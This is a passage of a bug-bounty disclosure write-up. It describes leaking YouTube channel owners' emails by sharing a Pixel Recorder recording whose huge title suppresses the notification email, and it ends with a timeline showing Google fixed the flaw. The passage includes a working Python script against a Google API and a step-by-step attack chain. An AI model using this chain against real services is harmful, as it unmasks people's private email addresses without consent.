\u003c/span\u003eESF\n\u003cspan\u003eContent-Length\u003c/span\u003e\u003cspan\u003e: \u003c/span\u003e138\n\n\u003cspan\u003e[\u003cspan\u003e\u0026#34;28bc3792-9bdb-4aed-9a78-17b0954abc7d\u0026#34;\u003c/span\u003e,[[null,\u003cspan\u003e2\u003c/span\u003e,\u003cspan\u003e\u0026#34;\u003ca href=\"https://brutecat.com/cdn-cgi/l/email-protection\" data-cfemail=\"1b697e7f7a786f7e7f5b7c767a727735787476\"\u003e[email protected]\u003c/a\u003e\u0026#34;\u003c/span\u003e],[null,\u003cspan\u003e2\u003c/span\u003e,\u003cspan\u003e\u0026#34;\u003ca href=\"https://brutecat.com/cdn-cgi/l/email-protection\" data-cfemail=\"e395919397869097d1a3848e828a8fcd808c8e\"\u003e[email protected]\u003c/a\u003e\u0026#34;\u003c/span\u003e]]]\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n            \u003ch3 id=\"a-small-problem-preventing-notification-to-the-target\"\u003e\n              A small problem: preventing notification to the target\n            \u003c/h3\u003e\u003cp\u003eIt seems that whenever we share a recording with a victim, they receive an email that looks like this:\u003cbr/\u003e‎\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://brutecat.com/assets/leaking-youtube-emails/recorder_victim.png\"/\u003e\u003cbr/\u003e‎\u003c/p\u003e\n\u003cp\u003eThis is \u003cstrong\u003ereally bad\u003c/strong\u003e, and it would lower the impact of the bug quite a lot. On the share pop-up, there didn\u0026#39;t seem to be any option to disable notifications.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://brutecat.com/assets/leaking-youtube-emails/share_recording.png\"/\u003e\u003c/p\u003e\n\u003cp\u003eI tried leaking the full request proto via my tool \u003ca href=\"https://github.com/ddd/googleapi_tools/tree/main/req2proto\"\u003ereq2proto\u003c/a\u003e, but there was nothing about disabling the email notification:\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003esyntax = \u003cspan\u003e\u0026#34;proto3\u0026#34;\u003c/span\u003e;\n\n\u003cspan\u003epackage\u003c/span\u003e java.com.google.wireless.android.pixel.recorder.protos;\n\n\u003cspan\u003eimport\u003c/span\u003e \u003cspan\u003e\u0026#34;java/com/google/wireless/android/pixel/recorder/sharedclient/acl/protos/message.proto\u0026#34;\u003c/span\u003e;\n\n\u003cspan\u003emessage \u003c/span\u003e\u003cspan\u003eWriteShareListRequest\u003c/span\u003e {\n  \u003cspan\u003estring\u003c/span\u003e recording_id = \u003cspan\u003e1\u003c/span\u003e;\n  \u003cspan\u003estring\u003c/span\u003e delete_obfuscated_gaia_ids = \u003cspan\u003e2\u003c/span\u003e;\n  ShareUser update_shared_users = \u003cspan\u003e3\u003c/span\u003e;\n  \u003cspan\u003estring\u003c/span\u003e sharing_message = \u003cspan\u003e4\u003c/span\u003e;\n}\n\n\u003cspan\u003emessage \u003c/span\u003e\u003cspan\u003eShareUser\u003c/span\u003e {\n  \u003cspan\u003estring\u003c/span\u003e obfuscated_gaia_id = \u003cspan\u003e1\u003c/span\u003e;\n  java.com.google.wireless.android.pixel.recorder.sharedclient.acl.protos.ResourceAccessRole role = \u003cspan\u003e2\u003c/span\u003e;\n  \u003cspan\u003estring\u003c/span\u003e email = \u003cspan\u003e3\u003c/span\u003e;\n}\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eEven trying to add and remove the user at the same time didn\u0026#39;t work, the email was still sent. But that\u0026#39;s when we realized - if it\u0026#39;s including our recording title in the email subject, perhaps it wouldn\u0026#39;t be able to send an email if our recording title was too long.\u003cbr/\u003e‎\u003c/p\u003e\n\u003cp\u003eWe hacked together a quick python script to test this out:\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e\u003cspan\u003eimport\u003c/span\u003e requests\n\nBASE_URL = \u003cspan\u003e\u0026#34;https://pixelrecorder-pa.clients6.google.com/$rpc/java.com.google.wireless.android.pixel.recorder.protos.PlaybackService/\u0026#34;\u003c/span\u003e\n\nheaders = {\n    \u003cspan\u003e\u0026#34;Host\u0026#34;\u003c/span\u003e: \u003cspan\u003e\u0026#34;pixelrecorder-pa.clients6.google.com\u0026#34;\u003c/span\u003e,\n    \u003cspan\u003e\u0026#34;Content-Type\u0026#34;\u003c/span\u003e: \u003cspan\u003e\u0026#34;application/json+protobuf\u0026#34;\u003c/span\u003e,\n    \u003cspan\u003e\u0026#34;X-Goog-Api-Key\u0026#34;\u003c/span\u003e: \u003cspan\u003e\u0026#34;AIzaSyCqafaaFzCP07GzWUSRw0oXErxSlrEX2Ro\u0026#34;\u003c/span\u003e,\n    \u003cspan\u003e\u0026#34;Origin\u0026#34;\u003c/span\u003e: \u003cspan\u003e\u0026#34;https://recorder.google.com\u0026#34;\u003c/span\u003e\n}\n\n\u003cspan\u003edef\u003c/span\u003e \u003cspan\u003eget_recording_uuid\u003c/span\u003e(\u003cspan\u003eshare_id: \u003cspan\u003estr\u003c/span\u003e\u003c/span\u003e):\n    payload = \u003cspan\u003ef\u0026#34;[\\\u0026#34;\u003cspan\u003e{share_id}\u003c/span\u003e\\\u0026#34;]\u0026#34;\u003c/span\u003e\n    response = requests.post(BASE_URL + \u003cspan\u003e\u0026#34;GetRecordingInfo\u0026#34;\u003c/span\u003e + \u003cspan\u003e\u0026#34;?alt=json\u0026#34;\u003c/span\u003e, headers=headers, data=payload)\n    \u003cspan\u003eif\u003c/span\u003e response.status_code != \u003cspan\u003e200\u003c/span\u003e:\n        \u003cspan\u003eprint\u003c/span\u003e(\u003cspan\u003e\u0026#34;unknown error when getting recording uuid: \u0026#34;\u003c/span\u003e, response.json())\n        exit(\u003cspan\u003e1\u003c/span\u003e)\n    \u003cspan\u003etry\u003c/span\u003e:\n        response = response.json()\n    \u003cspan\u003eexcept\u003c/span\u003e:\n        \u003cspan\u003eprint\u003c/span\u003e(\u003cspan\u003e\u0026#39;can\\\u0026#39;t parse response when getting recording uuid: \u0026#39;\u003c/span\u003e, response.text)\n        exit(\u003cspan\u003e1\u003c/span\u003e)\n\n    \u003cspan\u003ereturn\u003c/span\u003e response[\u003cspan\u003e\u0026#34;recording\u0026#34;\u003c/span\u003e][\u003cspan\u003e\u0026#34;uuid\u0026#34;\u003c/span\u003e]\n\n\u003cspan\u003edef\u003c/span\u003e \u003cspan\u003eupdate_recording_title\u003c/span\u003e(\u003cspan\u003eshare_id: \u003cspan\u003estr\u003c/span\u003e\u003c/span\u003e):\n    x = \u003cspan\u003e\u0026#39;X\u0026#39;\u003c/span\u003e*\u003cspan\u003e2500000\u003c/span\u003e \u003cspan\u003e# 2.5 million char long title name!\u003c/span\u003e\n    payload = \u003cspan\u003ef\u0026#39;[\u0026#34;\u003cspan\u003e{share_id}\u003c/span\u003e\u0026#34;,\u0026#34;\u003cspan\u003e{x}\u003c/span\u003e\u0026#34;]\u0026#39;\u003c/span\u003e\n    response = requests.post(BASE_URL + \u003cspan\u003e\u0026#34;UpdateRecordingTitle\u0026#34;\u003c/span\u003e + \u003cspan\u003e\u0026#34;?alt=json\u0026#34;\u003c/span\u003e, headers=headers, data=payload)\n    \u003cspan\u003eif\u003c/span\u003e response.status_code != \u003cspan\u003e200\u003c/span\u003e:\n        \u003cspan\u003eprint\u003c/span\u003e(\u003cspan\u003e\u0026#34;unknown error when updating recording title: \u0026#34;\u003c/span\u003e, response.json())\n        exit(\u003cspan\u003e1\u003c/span\u003e)\n\n\u003cspan\u003edef\u003c/span\u003e \u003cspan\u003emain\u003c/span\u003e():\n    share_id = \u003cspan\u003einput\u003c/span\u003e(\u003cspan\u003e\u0026#34;Enter share ID: \u0026#34;\u003c/span\u003e)\n    headers[\u003cspan\u003e\u0026#34;Cookie\u0026#34;\u003c/span\u003e] = \u003cspan\u003einput\u003c/span\u003e(\u003cspan\u003e\u0026#34;Cookie header:\u0026#34;\u003c/span\u003e )\n    headers[\u003cspan\u003e\u0026#34;Authorization\u0026#34;\u003c/span\u003e] = \u003cspan\u003einput\u003c/span\u003e(\u003cspan\u003e\u0026#34;Authorization header: \u0026#34;\u003c/span\u003e)\n    uuid = get_recording_uuid(share_id)\n    \u003cspan\u003eprint\u003c/span\u003e(\u003cspan\u003e\u0026#34;UUID:\u0026#34;\u003c/span\u003e, uuid)\n    update_recording_title(uuid)\n    \u003cspan\u003eprint\u003c/span\u003e(\u003cspan\u003e\u0026#34;Updated recording title successfully.\u0026#34;\u003c/span\u003e)\n\n\u003cspan\u003eif\u003c/span\u003e __name__ == \u003cspan\u003e\u0026#34;__main__\u0026#34;\u003c/span\u003e:\n    main()\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e... and the recording title was now \u003cstrong\u003e2.5 million letters long!\u003c/strong\u003e There wasn\u0026#39;t any server-side limit to the length of a recording name.\u003cbr/\u003e‎\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://brutecat.com/assets/leaking-youtube-emails/long_recording_name.png\"/\u003e\u003cbr/\u003e‎\u003c/p\u003e\n\u003cp\u003eTrying to share the recording with a different test user... \u003cstrong\u003ebingo!\u003c/strong\u003e No notification email.\u003cbr/\u003e‎\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://brutecat.com/assets/leaking-youtube-emails/no_gmail_notification.png\"/\u003e\u003c/p\u003e\n\n            \u003ch3 id=\"putting-it-all-together\"\u003e\n              Putting it all together\n            \u003c/h3\u003e\u003cp\u003eWe basically have the full attack chain, we just have to put it together.\u003cbr/\u003e‎\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eLeak the obfuscated Gaia ID of the YouTube channel from the Innertube endpoint \u003ccode\u003e/get_item_context_menu\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eShare the Pixel recording with an extremely long name with the target to convert the Gaia ID to an email\u003c/li\u003e\n\u003cli\u003eRemove the target from the Pixel recording (cleanup)\u003cbr/\u003e‎\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eHere\u0026#39;s a POC of the exploit in action:\u003c/p\u003e\n\u003ciframe src=\"https://www.youtube.com/embed/vy_hkDEQKjA\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share\" referrerpolicy=\"strict-origin-when-cross-origin\" allowfullscreen=\"\"\u003e\u003c/iframe\u003e\n\n\n            \u003ch3 id=\"timeline\"\u003e\n              Timeline\n            \u003c/h3\u003e\u003cul\u003e\n\u003cli\u003e15/09/24 - Report sent to vendor\u003c/li\u003e\n\u003cli\u003e16/09/24 - Vendor triaged report\u003c/li\u003e\n\u003cli\u003e16/09/24 - 🎉 \u003cstrong\u003eNice catch!\u003c/strong\u003e\u003c/li\u003e\n\u003cli\u003e03/10/24 - Panel marks it as duplicate of existing-tracked bug, does botched patch of initial YouTube obfuscated Gaia ID disclosure\u003c/li\u003e\n\u003cli\u003e03/10/24 - Clarified to vendor that they haven\u0026#39;t recognized Pixel recorder as vulnerability itself (since obfuscated Gaia IDs are leaked for Google Maps/Play reviewers) and provided vendor a work-around method to once again leak YouTube channel obfuscated Gaia IDs\u003c/li\u003e\n\u003cli\u003e05/11/24 - \u003cstrong\u003ePanel awards $3,133.\u003c/strong\u003e Rationale: Exploitation likelihood is medium. Issue qualified as an abuse-related methodology with high impact.\u003c/li\u003e\n\u003cli\u003e03/12/24 - Product team sent report back to panel for additional reward consideration, coordinates disclosure for 03/02/2025\u003c/li\u003e\n\u003cli\u003e12/12/24 - \u003cstrong\u003ePanel awards an additional $7,500.\u003c/strong\u003e Rationale: Exploitation likelihood is high. Issue qualified as an abuse-related methodology with high impact. Applied 1 downgrade from the base amount due to complexity of attack chain required.\u003c/li\u003e\n\u003cli\u003e29/01/25 - Vendor requests extension for disclosure to 12/02/2025\u003c/li\u003e\n\u003cli\u003e09/02/25 - Confirm to vendor that both parts of the exploit have been fixed (T+147 days since disclosure)\u003c/li\u003e\n\u003cli\u003e12/02/25 - Report disclosed\u003c/li\u003e\n\u003c/ul\u003e\n \u003chr/\u003e \u003cp data-svelte-h=\"svelte-uqqsu8\"\u003eYou can contact me via\n\t\t\t\t\u003ca href=\"https://signal.me/#eu/oT3XakzbgN6x5fLe37yBwfssy4KVje3aqZyCVArWxofNQ7FbnOdHfpfs3sn6Lfn6\"\u003e\u003cimg src=\"data:image/svg+xml,%3c!DOCTYPE%20svg%20PUBLIC%20\u0026#39;-//W3C//DTD%20SVG%201.1//EN\u0026#39;%20\u0026#39;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\u0026#39;%3e%3c!--%20Uploaded%20to:%20SVG%20Repo,%20www.svgrepo.com,%20Transformed%20by:%20SVG%20Repo%20Mixer%20Tools%20--%3e%3csvg%20width=\u0026#39;800px\u0026#39;%20height=\u0026#39;800px\u0026#39;%20viewBox=\u0026#39;0%200%2048%2048\u0026#39;%20id=\u0026#39;Layer_2\u0026#39;%20data-name=\u0026#39;Layer%202\u0026#39;%20xmlns=\u0026#39;http://www.w3.org/2000/svg\u0026#39;%20fill=\u0026#39;%23ffffff\u0026#39;%20stroke=\u0026#39;%23ffffff\u0026#39;%3e%3cg%20id=\u0026#39;SVGRepo_bgCarrier\u0026#39;%20stroke-width=\u0026#39;0\u0026#39;/%3e%3cg%20id=\u0026#39;SVGRepo_tracerCarrier\u0026#39;%20stroke-linecap=\u0026#39;round\u0026#39;%20stroke-linejoin=\u0026#39;round\u0026#39;/%3e%3cg%20id=\u0026#39;SVGRepo_iconCarrier\u0026#39;%3e%3cdefs%3e%3cstyle%3e.cls-1{fill:none;stroke:%23ffffff;stroke-linejoin:round;}%3c/style%3e%3c/defs%3e%3cpath%20stroke-width=\u0026#39;2px\u0026#39;%20class=\u0026#39;cls-1\u0026#39;%20d=\u0026#39;M27.32,45.25A23.08,23.08,0,0,1,24,45.5a22.26,22.26,0,0,1-3.26-.25m14.44-2.88a21,21,0,0,1-6.08,2.51M41.36,36.7a21.63,21.63,0,0,1-4.66,4.65m5.65-6.16,2.54-6.08a21.25,21.25,0,0,1-2.52,6.07m2.88-14.42A23.33,23.33,0,0,1,45.5,24a22.43,22.43,0,0,1-.25,3.28m-42.46,0A22.46,22.46,0,0,1,2.5,24a22.43,22.43,0,0,1,.25-3.28m39.63-7.89a21.7,21.7,0,0,1,2.51,6.08m-41.69,0a21.19,21.19,0,0,1,2.52-6.06h0m31-6.2a21.19,21.19,0,0,1,4.66,4.65m-34.71,0A21.63,21.63,0,0,1,11.3,6.64M29.09,3.1a21.57,21.57,0,0,1,6.07,2.53h0m-22.33,0a21.07,21.07,0,0,1,6.09-2.51m1.84-.37A21.88,21.88,0,0,1,24,2.5a22.29,22.29,0,0,1,3.27.25\u0026#39;/%3e%3cpath%20stroke-width=\u0026#39;2px\u0026#39;%20class=\u0026#39;cls-1\u0026#39;%20d=\u0026#39;M18.87,44.87a20.92,20.92,0,0,1-5-1.95l-2.24.51\u0026#39;/%3e%3cpath%20stroke-width=\u0026#39;2px\u0026#39;%20class=\u0026#39;cls-1\u0026#39;%20d=\u0026#39;M4.61,36.38l.51-2.2a21.7,21.7,0,0,1-2-5\u0026#39;/%3e%3cpath%20stroke-width=\u0026#39;2px\u0026#39;%20class=\u0026#39;cls-1\u0026#39;%20d=\u0026#39;M10,43.85l-4.08,1a2.19,2.19,0,0,1-2.66-1.56,2.27,2.27,0,0,1,0-1.1l1-4.08\u0026#39;/%3e%3cpath%20stroke-width=\u0026#39;2px\u0026#39;%20class=\u0026#39;cls-1\u0026#39;%20d=\u0026#39;M24,6.41a17.59,17.59,0,0,0-14.83,27l-1.65,7.1,7.16-1.64A17.59,17.59,0,1,0,24,6.41Z\u0026#39;/%3e%3c/g%3e%3c/svg%3e\" alt=\"signal icon\"/\u003e\u003c/a\u003e\n\t\t\t\tor\n\t\t\t\t\u003ca href=\"https://brutecat.com/cdn-cgi/l/email-protection#087a67677c486a7a7d7c6d6b697c266b6765\"\u003e\u003cimg src=\"data:image/svg+xml,%3c!DOCTYPE%20svg%20PUBLIC%20\u0026#39;-//W3C//DTD%20SVG%201.1//EN\u0026#39;%20\u0026#39;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\u0026#39;%3e%3c!--%20Uploaded%20to:%20SVG%20Repo,%20www.svgrepo.com,%20Transformed%20by:%20SVG%20Repo%20Mixer%20Tools%20--%3e%3csvg%20width=\u0026#39;800px\u0026#39;%20height=\u0026#39;800px\u0026#39;%20viewBox=\u0026#39;0%200%2024%2024\u0026#39;%20fill=\u0026#39;none\u0026#39;%20xmlns=\u0026#39;http://www.w3.org/2000/svg\u0026#39;%3e%3cg%20id=\u0026#39;SVGRepo_bgCarrier\u0026#39;%20stroke-width=\u0026#39;0\u0026#39;/%3e%3cg%20id=\u0026#39;SVGRepo_tracerCarrier\u0026#39;%20stroke-linecap=\u0026#39;round\u0026#39;%20stroke-linejoin=\u0026#39;round\u0026#39;/%3e%3cg%20id=\u0026#39;SVGRepo_iconCarrier\u0026#39;%3e%3cpath%20d=\u0026#39;M4%207.00005L10.2%2011.65C11.2667%2012.45%2012.7333%2012.45%2013.8%2011.65L20%207\u0026#39;%20stroke=\u0026#39;%23ffffff\u0026#39;%20stroke-width=\u0026#39;1\u0026#39;%20stroke-linecap=\u0026#39;round\u0026#39;%20stroke-linejoin=\u0026#39;round\u0026#39;/%3e%3crect%20x=\u0026#39;3\u0026#39;%20y=\u0026#39;5\u0026#39;%20width=\u0026#39;18\u0026#39;%20height=\u0026#39;14\u0026#39;%20rx=\u0026#39;2\u0026#39;%20stroke=\u0026#39;%23ffffff\u0026#39;%20stroke-width=\u0026#39;1\u0026#39;%20stroke-linecap=\u0026#39;round\u0026#39;/%3e%3c/g%3e%3c/svg%3e\" alt=\"email icon\"/\u003e\u003c/a\u003e\u003c/p\u003e\u003c/article\u003e\u003c/div\u003e",
  "readingTime": "13 min read",
  "publishedTime": null,
  "modifiedTime": null
}
